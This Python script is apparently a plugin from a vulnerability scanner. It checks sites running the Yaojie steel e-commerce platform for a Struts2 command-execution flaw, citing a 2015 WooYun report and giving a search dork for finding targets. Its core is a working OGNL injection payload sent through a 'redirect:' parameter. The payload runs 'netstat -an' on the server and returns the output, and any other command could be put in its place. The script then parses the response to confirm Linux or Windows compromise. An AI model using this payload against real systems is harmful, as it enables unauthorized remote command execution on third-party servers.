#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 垚捷电商平台通用struts命令执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0105820
author: Lucifer
description: 上海垚捷公司的钢材电商平台存在通用性struts漏洞,google:"ecp/announcement/announcement_view2.action"。
'''
import sys
import requests
import warnings
from termcolor import cprint

class yaojie_steel_struts_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ecp/announcement/announcement_view2.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Active Internet connections" in req.text:
                cprint("[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]", "red")
                return True, vulnurl, "垚捷电商平台通用struts命令执行", payload, req.text
            elif r"Active Connections" in req.text or r"活动连接" in req.text:
                cprint("[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]", "red")
                return True, vulnurl, "垚捷电商平台通用struts命令执行", payload, req.text
            elif r"LISTEN" in req.text:
                cprint("[+]可能存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "垚捷电商平台通用struts命令执行", payload, req.text
            else:
                cprint("[-]不存在yaojie_steel_struts_exec漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yaojie_steel_struts_exec_BaseVerify(sys.argv[1])
    testVuln.run()